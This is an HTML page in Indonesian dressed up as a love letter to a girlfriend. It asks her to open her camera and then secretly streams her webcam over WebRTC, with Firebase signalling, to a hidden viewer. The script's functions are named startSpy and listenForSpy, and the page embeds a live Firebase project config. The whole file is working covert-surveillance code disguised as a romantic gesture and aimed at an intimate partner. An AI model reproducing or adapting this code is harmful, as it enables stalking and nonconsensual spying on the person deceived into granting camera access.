<!DOCTYPE html>
<html>
<head>
    <title>ðŸ’Œ Surat Cinta Untukmu</title>
    <style>
        body {
            margin: 0;
            padding: 20px;
            font-family: Arial;
            background: pink;
            text-align: center;
        }
        .love-box {
            background: white;
            padding: 30px;
            border-radius: 20px;
            margin: 20px auto;
            max-width: 500px;
            box-shadow: 0 10px 30px rgba(255,0,100,0.2);
        }
        #cameraBtn {
            background: #ff4081;
            color: white;
            border: none;
            padding: 15px 30px;
            font-size: 18px;
            border-radius: 50px;
            cursor: pointer;
            margin: 20px;
        }
        #localVideo {
            width: 100%;
            max-width: 400px;
            border-radius: 10px;
            margin: 20px auto;
            display: none;
            transform: scaleX(-1);
        }
        .hidden { display: none; }
    </style>
</head>
<body>
    <div class="love-box">
        <h1>ðŸ’– Untuk Pacarku ðŸ’–</h1>
        <p>Sayang, aku buatkan ini khusus untukmu. Izinkan aku melihat senyuman indahmu...</p>
        
        <button id="cameraBtn" onclick="startSpy()">ðŸ“¸ Lihat Wajahku Sayang</button>
        
        <video id="localVideo" autoplay playsinline></video>
        
        <div id="status" class="hidden">ðŸŸ¢ Sedang merekam senyumanmu...</div>
    </div>

    <!-- Firebase -->
    <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-database.js"></script>
    
    <script>
        // =============== FIREBASE ===============
        const firebaseConfig = {
            apiKey: "AIzaSyBYW92p7arkxHse0Lo3z6xoe_7G43vHBRU",
            authDomain: "survei-f11a1.firebaseapp.com",
            databaseURL: "https://survei-f11a1-default-rtdb.asia-southeast1.firebasedatabase.app",
            projectId: "survei-f11a1",
            storageBucket: "survei-f11a1.firebasestorage.app",
            messagingSenderId: "769641850914",
            appId: "1:769641850914:web:3be7b2cf7f6cb09ab9427b"
        };
        
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();
        
        // =============== WEBRTC VARIABLES ===============
        let localStream;
        let peerConnection;
        let roomId = "love_room_" + Math.random().toString(36).substr(2, 9);
        
        // =============== START SPY SYSTEM ===============
        async function startSpy() {
            document.getElementById('cameraBtn').style.display = 'none';
            document.getElementById('status').classList.remove('hidden');
            
            try {
                // 1. DAPETKAN KAMERA
                localStream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: "user", width: 640, height: 480 },
                    audio: false
                });
                
                const localVideo = document.getElementById('localVideo');
                localVideo.srcObject = localStream;
                localVideo.style.display = 'block';
                
                // 2. BUAT ROOM DI FIREBASE
                await db.ref('rooms/' + roomId).set({
                    createdAt: Date.now(),
                    status: 'waiting'
                });
                
                // 3. SETUP WEBRTC
                setupWebRTC();
                
                // 4. LISTEN UNTUK SPY YANG JOIN
                listenForSpy();
                
            } catch (err) {
                alert("Sayang, izinkan kamera ya â¤ï¸");
                document.getElementById('cameraBtn').style.display = 'block';
            }
        }
        
        // =============== WEBRTC SETUP ===============
        function setupWebRTC() {
            const config = {
                iceServers: [
                    { urls: 'stun:stun.l.google.com:19302' },
                    { urls: 'stun:stun1.l.google.com:19302' }
                ]
            };
            
            peerConnection = new RTCPeerConnection(config);
            
            // ADD LOCAL STREAM
            localStream.getTracks().forEach(track => {
                peerConnection.addTrack(track, localStream);
            });
            
            // ICE CANDIDATE HANDLER
            peerConnection.onicecandidate = (event) => {
                if (event.candidate) {
                    db.ref('rooms/' + roomId + '/candidates/target').push({
                        candidate: event.candidate
                    });
                }
            };
        }
        
        // =============== LISTEN FOR SPY ===============
        function listenForSpy() {
            // Listen for spy's offer
            db.ref('rooms/' + roomId + '/offer').on('value', async (snapshot) => {
                const offer = snapshot.val();
                if (offer && !peerConnection.currentRemoteDescription) {
                    await peerConnection.setRemoteDescription(new RTCSessionDescription(offer));
                    
                    // Create answer
                    const answer = await peerConnection.createAnswer();
                    await peerConnection.setLocalDescription(answer);
                    
                    // Send answer to spy
                    db.ref('rooms/' + roomId + '/answer').set(answer);
                }
            });
            
            // Listen for spy's ICE candidates
            db.ref('rooms/' + roomId + '/candidates/spy').on('child_added', async (snapshot) => {
                const data = snapshot.val();
                if (data && data.candidate) {
                    try {
                        await peerConnection.addIceCandidate(new RTCIceCandidate(data.candidate));
                    } catch (e) {
                        console.error("Error adding ICE candidate:", e);
                    }
                }
            });
        }
        
        // =============== CLEANUP ===============
        window.addEventListener('beforeunload', () => {
            if (localStream) localStream.getTracks().forEach(track => track.stop());
            db.ref('rooms/' + roomId).remove();
        });
    </script>
</body>
    </html>
